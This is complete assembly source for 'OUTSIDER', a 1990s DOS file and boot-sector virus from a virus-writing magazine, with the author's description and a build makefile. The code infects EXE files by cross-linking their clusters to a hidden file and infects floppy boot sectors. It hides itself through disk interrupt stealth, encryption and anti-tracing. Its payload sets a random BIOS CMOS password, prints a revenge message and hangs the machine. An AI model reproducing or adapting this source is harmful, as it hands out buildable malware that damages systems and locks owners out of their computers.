
;      ‹‹                  €
;     ﬂﬂﬂ  Virus Magazine  € Box 176, Kiev 210, Ukraine      IV  1997
;     ﬂ€€ ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ € ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ ﬂ ﬂﬂﬂﬂﬁﬂﬂﬂ  €ﬂﬂﬂﬂﬂﬂ€
;      ﬁ€ €ﬂ‹ €ﬂﬂ ‹ﬂﬂ ‹ﬂﬂ ‹€‹ ‹ﬂﬂ €ﬂ€    › € ‹ﬂ€ € ‹ﬂﬂ €‹‹   € €  € €
;       € € € €ﬂ  €ﬂ  €    €  €ﬂ  € €    € € € € € €   €     € €  € €
;       € ﬁ ﬁ ﬁ   ﬁ‹‹ ﬁ‹‹  ﬁ  ﬁ‹‹ ﬁ‹ﬂ     ﬂ€ ﬂ‹€ ﬁ ﬁ‹‹ ﬁ‹‹‹  € €  € €
;       ﬁ ‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹ ‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹  €‹‹‹‹‹‹€
;          (C) Copyright, 1994-97, by STEALTH group WorldWide, unLtd.

;        It's the finished version of OUTSIDER... I'm don't do a poly
;engine for this, because the code is very uncompatible, and will not spread
;much... It's crashed sometimes (very often in true ;> ) in win95...
;        When a infected file is run, it will create a file in root of name
;0xff (this file is hidden, system and read only) and get the starting 
;cluster of him...
;        Now all the directories read througth (i think that i spell this
;word wrong) int 13 will cross-link EXE files to the file C:\0xff, and do the
;EXE file read only... I do this because you delete a infected EXE without
;the virus resident the cluster of the file 0xff will be marked as free, and
;the next file copied to hd will overwrite all infected files... It also
;infect floppies boot sector...
;        When you execute a infected file without the virus resident, it will
;go resident as a low memory TSR and restart the infected file... This is the
;motive i don't infect file that will be run throught CONFIG.SYS, like SETVER,
;EMM386 and others...
;        When you boot trouhgt a infected floppy, it hook int 13 for stealth,
;but don't infect files... It wait for 16 dir sectors be read and then hook
;int 28... When int 28 is called(DOS is idle), it create and/or get the start
;cluster of C:\0xff and restore int 28... Now it infect files too...
;        The original boot code and the virus code is stored in the last
;sectors of root dir... I put only a loader in the boot code... It have full
;stealth in boot sectors and EXE files...
;        If you try of trace the file or the int 13 chain, or 3 month passed
;since hd infection, the virus will put a random psw in the cmos memory, for
;POST and SETUP acess... It have a change of display a msg too...
;       The msg is something like "This is my revenge for a sick society, and
;this is not enought. Wait and see..."
;       This virus is only incompatible i think... it don't have any bug, I
;hope...
;       It infect very fast, using all antivirus as a vector for infection...
;Try run CHKDSK and all your hd will be infected...

;*****************************OUTSIDER******************************
.model tiny
.386
.code
.startup

       v_size   equ offset lastbyte-offset startvir
       v_size_r equ ((offset lastbyte-offset startvir+100h+0fh) / 10h)*2
       v_size_s equ (offset lastbyte-offset startvir+01ffh) / 200h
       com_ofs  equ 0100h
       _dword   equ 4
       _word    equ 2
       _byte    equ 1
       count    equ com_ofs-_byte
       mypos    equ count-_word
       i13      equ mypos-_dword
       myuse    equ i13-_byte
       old28    equ myuse-_dword

startvir:
                push ax
                dec bx
                mov si, offset lastbyte
crypt:
                xor byte ptr cs:[si], 00
       value    equ byte ptr $ -1
                dec si
                cmp si, offset startenc-1
                je instalacao
                jmp crypt

startenc:
                db 00,'Written by Vecna/SGWW in Brazil 1997',00

instalacao:
                push cs
                pop ds
                call antitrace
nonzero:
                in al, 40h
                or al, al
                jz nonzero
                mov byte ptr ds:[value], al
                mov byte ptr ds:[value2], al
                mov byte ptr ds:[count], 0fh
                mov byte ptr ds:[myuse], 0h
                mov word ptr ds:[mypos], -1
                cmp word ptr ds:[0], 020cdh
                push 0
                pop ds
                jne boot
                mov ah, 0fbh
                int 13h
                jnc sair
                call infectdrive
                push cs
                push cs
                pop es
                call hook
                mov ah, 2ah
                int 21h
                cmp dh, 00
       mes      equ byte ptr $ -1
                jne nopayload
                jmp payload
sair:
                mov byte ptr cs:[del], 41h
                dec byte ptr cs:[quit]
nopayload:
                mov ah, 0dh
                int 21h
                cld
                mov es, word ptr cs:[2ch]
                xor ax, ax
                mov di, 1
seek:
                dec di
                scasw
                jne seek
                add di, 2
                mov dx, di
                push es
                pop ds
                push cs
                pop es
                mov ah, 4ah
                mov bx, v_size_r
                int 21h
                mov word ptr cs:[psp1], ax
                mov word ptr cs:[psp2], ax
                mov word ptr cs:[psp3], ax
                mov ax, 4b00h
       del      equ byte ptr $ -1
                mov bx, offset paramblock
                int 21h
                mov ah, 4dh
       quit     equ byte ptr $ -1
                int 21h
                mov ah, 31h
                mov dx, v_size_r
                int 21h

boot:
                mov ax, 0201h
                mov cx, 1
                mov dx, 80h
                mov bx, 7c00h
                push ds
                pop es
                int 13h
                push es
                push bx
                sub word ptr ds:[413h], v_size_s
                int 12h
                shl ax, 6
                push ax
                pop es
                push cs
                pop ds
                cld
                xor di, di
                mov si, di
                mov cx, v_size+0100h
                rep movsb
                push 0
                pop ds
hook:
                cli
                lgs bx, dword ptr ds:[13h*4]
                mov word ptr es:[i13], bx
                mov ax, gs
                mov word ptr es:[i13+2], ax
                mov ax, offset int13
                mov word ptr ds:[13h*4], ax
                mov ax, es
                mov word ptr ds:[13h*4+2], ax
                sti
                retf

encrypt:
                mov si, offset startvir
                mov di, offset lastbyte
                mov cx, v_size
cryptloop:
                lodsb
                cmp si, offset startenc
                jbe store
                xor al, 00
       value2   equ byte ptr $ -1
store:
                stosb
                loop cryptloop
                ret

infectdrive:
                pusha
                push es
                push ds
                push cs
                push cs
                pop ds
                pop es
                mov ax, 3d00h
                mov dx, offset filename
                int 21h
                xchg ax, bx
                jnc getsft
                mov ah, 2ah
                int 21h
                mov al, dh
                add al, 3
                cmp al, 12
                jbe noyear
                sub al, 12
noyear:
                mov byte ptr [mes], al
                in al, 40h
                xchg ah, al
                in al, 40h
                mov word ptr [encval1], ax
                mov word ptr [encval2], ax
                mov ah, 3ch
                mov cx, 7
                mov dx, offset filename
                int 21h
                push ax
                call encrypt
                pop bx
                mov ah, 40h
                mov cx, v_size
                mov dx, offset lastbyte
                int 21h
getsft:
                push bx
                mov ax, 1220h
                int 2fh
                mov bl, byte ptr es:[di]
                mov ax, 1216h
                int 2fh
                pop bx
                mov ax, word ptr es:[di+11]
                mov word ptr ds:[mypos],ax
                mov ah, 3eh
                int 21h
                pop ds
                pop es
                popa
                ret

call13:
                pushf
                call dword ptr cs:[i13]
                ret

bootinfect:
                cmp ax, 201h
                jne error
                cmp cx, 1
                jne error
                cmp dh, 0
                jne error
                call call13
                jc exiterror
infectfloppy:
                pushf
                pusha
                push es
                push ds
                push es
                pop ds
                mov ax, word ptr cs:[boot_start]
                cmp word ptr [bx+3eh], ax
                je stealth
                call getsectordir
                push cs
                pop ds
                push ax
                sub al, v_size_s
                mov word ptr [load_cx], ax
                pop cx
                mov ax, 301h
                mov dh, 1
                call call13
                add bx, 3eh
                mov cx, offset boot_end-offset boot_start
                mov si, offset boot_start
                mov di, bx
                rep movsb
                mov ax, 301h
                sub bx, 3eh
                inc cx
                xor dh, dh
                call call13
                push cs
                pop es
                call encrypt
                mov ax, 300h+v_size_s
                mov cx, word ptr [load_cx]
                mov dh, 1
                mov bx, offset lastbyte
                call call13
stealth:
                pop ds
                pop es
                popa
                popf
                push ds
                push es
                pop ds
                call getsectordir
                mov cx, ax
                mov dh, 1
                mov ax, 201h
                call call13
                pop ds
                jmp exiterror
error:
                call call13
exiterror:
                retf 2

getsectordir:
                mov cx, word ptr [bx+11h]
                shr cx, 4
                xor ax, ax
                mov al, byte ptr [bx+10h]
                mul word ptr [bx+16h]
                add ax, cx
                inc ax
                sub ax, word ptr [bx+18h]
                ret

int28:
                pusha
                push ds
                push 0
                pop ds
                inc byte ptr cs:[myuse]
                mov ax, word ptr cs:[old28]
                mov word ptr ds:[28h*4], ax
                mov ax, word ptr cs:[old28+2]
                mov word ptr ds:[28h*4+2], ax
                call infectdrive
                pop ds
                popa
                iret

int13:
                cmp ah, 0fbh
                jne notcheck
                clc
                iret
notcheck:
                call antitrace
                cmp dl, 80h
                jne bootinfect
hdinfect:
                mov word ptr cs:[save_dx], dx
                mov word ptr cs:[save_cx], cx
                call call13
                jc exitint
                pushf
                pusha
                push es
                push ds
                push es
                pop ds
                pusha
                sub bx, 32
                mov cx, 16
                xor ax, ax
loopcheck:
                add bx, 32
                cmp word ptr [bx.ds_ext], 'XE'
                jne notexe
                dec ax
notexe:
                loop loopcheck
                or ax, ax
                popa
                je notdir
                cmp word ptr cs:[mypos], -1
                jne infect
                cmp byte ptr cs:[myuse], 0
                jne memdisinfect
                dec byte ptr cs:[count]
                cmp byte ptr cs:[count], 0
                jne memdisinfect
                dec byte ptr cs:[myuse]
                pusha
                push ds
                push 0
                pop ds
                mov ax, offset int28
                xchg ax, word ptr ds:[28h*4]
                mov word ptr cs:[old28], ax
                mov ax, cs
                xchg ax, word ptr ds:[28h*4+2]
                mov word ptr cs:[old28+2], ax
                pop ds
                popa
                jmp memdisinfect
infect:
                pusha
                pushad
                sub bx, 32
                mov cx, 16
infectloop:
                add bx, 32
                cmp dword ptr [bx.ds_res], 0
                jnz doloop
                cmp word ptr [bx.ds_ext], 'XE'
                jne doloop
                cmp word ptr [bx.ds_size], v_size
                jb doloop
                mov eax, dword ptr [bx.ds_name]
                cmp eax, 'RAHS'
                je doloop
                cmp eax, '3MME'
                je doloop
                cmp eax, 'VTES'
                je doloop
                cmp eax, 'SVRD'
                je doloop
                cmp eax, 'ETNI'
                je doloop
                cmp eax, 'EZIS'
                je doloop
                or byte ptr [bx.ds_attr], 00000001b
                mov ax, word ptr [bx.ds_s_c]
                xor ax, 0h
       encval1  equ word ptr $-2
                mov word ptr [bx.ds_res], 'cV'
                mov word ptr [bx.ds_res+2], ax
                mov eax, dword ptr [bx.ds_size]
                mov dword ptr [bx.ds_res+4], eax
                mov ax, word ptr cs:[mypos]
                mov word ptr [bx.ds_s_c], ax
                mov dword ptr [bx.ds_size], v_size
doloop:
                loop infectloop
                popad
                mov ax, 301h
                mov cx, 0000
       save_cx  equ word ptr $ -2
                mov dx, 0000
       save_dx  equ word ptr $ -2
                call call13
                popa
memdisinfect:
                pushad
                sub bx, 32
                mov cx, 16
loopdisinfect:
                add bx, 32
                cmp word ptr [bx.ds_res], 'cV'
                jne doloop2
                mov ax, word ptr [bx.ds_res+2]
                xor ax, 0h
       encval2  equ word ptr $-2
                mov word ptr [bx.ds_s_c], ax
                mov eax, dword ptr [bx.ds_res+4]
                mov dword ptr [bx.ds_size], eax
                xor eax, eax
                mov dword ptr [bx.ds_res], eax
                mov dword ptr [bx.ds_res+4], eax
doloop2:
                loop loopdisinfect
                popad
notdir:
                pop ds
                pop es
                popa
                popf
exitint:
                retf 2
payload:
                push cs
                pop ds
                in al, 40h
                and al, 00000011b
                or al, al
                jnz checkbios
printmsg:
                mov ax, 3
                int 10h
                cld
                xor bx, bx
                call next
                db 10,13,7
                db 10,13,7
                db 10,13,7
                db '[OUTSIDER]',10,13
                db 'Esta Ç minha vinganáa contra esta sociedade injusta'
                db 10,13,'E eu ainda n∆o estou satisfeito',10,13
                db 'Espere e ver∆o...',10,13,00
next:
                pop si
pnext:
                mov ah, 0eh
                lodsb
                int 10h
                or al, al
                jnz pnext
checkbios:
                push 0f000h
                pop es
                xor di, di
                mov cx, -1
scan:
                pusha
                mov si, offset award
                mov cx, 5
                repe cmpsb
                popa
                jz award_psw
                inc di
                loop scan
ami_psw:
                mov ax, 002fh
                call read
                mov bx, ax
                mov al, 2dh
                call step1
                or al, 00010000b
                call step2
                mov al, 2fh
                mov dh, bl
                call write
                mov al, 3eh
                call read
                mov ah, al
                mov al, 3fh
                call read
                mov bx, ax
                mov ax, 0038h
                call rndpsw
                mov al, 39h
                call rndpsw
                mov dh, bh
                mov al, 3eh
                call write
                mov dh, bl
                mov al, 3fh
                call write
                jmp hehehe
award_psw:
                mov ax, 002fh
                call read
                mov bx, ax
                mov al, 11h
                call step1
                or al, 00000001b
                call step2
                mov al, 1bh
                call step1
                or al, 00100000b
                call step2
                mov al, 2fh
                mov dh, bl
                call write
                mov al, 7dh
                call read
                mov ah, al
                mov al, 7eh
                call read
                mov bx, ax
                mov ax, 0050h
                call rndpsw
                mov al, 51h
                call rndpsw
                mov dh, bh
                mov al, 7dh
                call write
                mov dh, bl
                mov al, 7eh
                call write
hehehe:
                cli
                jmp $
read:
                and al, 7fh
                out 70h, al
                jmp $+2
                jmp $+2
                in al, 71h
                ret
write:
                and al, 7fh
                out 70h, al
                jmp $+2
                mov al, dh
                out 71h, al
                ret
rndpsw:
                mov dh, al
                call read
                sub bx, ax
                in al, 40h
                add bx, ax
                xchg al, dh
                call write
                ret
step1:
                mov dh, al
                call read
                sub bx, ax
                ret
step2:
                add bx, ax
                xchg al, dh
                call write
                ret

award           db 'AWARD'

antitrace:
                pushf
                push ax
                push bx
                pop bx
                dec sp
                dec sp
                pop ax
                cmp ax, bx
                pop ax
                jne payload
ok:
                popf
                ret

       boot_start equ word ptr $
                mov ax, 7e0h
                mov es, ax
                mov bx, 100h
                mov cx, 0h
       load_cx  equ word ptr $ -2
                mov dx, 100h
                cli
                mov sp, 7c00h
                mov ax, cs
                mov ss, ax
                sti
                mov ax, 200h+v_size_s
                int 13h
                db 0eah
                dw 0100h
                dw 07e0h
       boot_end equ $

filename        db 'C:\',255,0

paramblock      dw 0
                dw 0080h
psp1            dw 0
                dw 005ch
psp2            dw 0
                dw 006ch
psp3            dw 0

       include  struc.asm

lastbyte       equ this byte

end
;*****************************OUTSIDER******************************

;*******************************STRUC*******************************
dir     struc
ds_name db 8 dup (?)
ds_ext  db 3 dup (?)
ds_attr db 1 dup (?)
ds_res  db 10 dup (?)
ds_time db 4 dup (?)
ds_s_c  db 2 dup (?)
ds_size db 4 dup (?)
ends
;*******************************STRUC*******************************

;*****************************MAKEFILE******************************
outsider.com : outsider.obj
        tlink /m /t /3 /x outsider.obj,outsider.com,,,,
#       link /tiny outsider.obj,outsider.com,,,,,

outsider.obj : outsider.asm struc.asm
        tasm /m9 /la outsider.asm
;*****************************MAKEFILE*****************************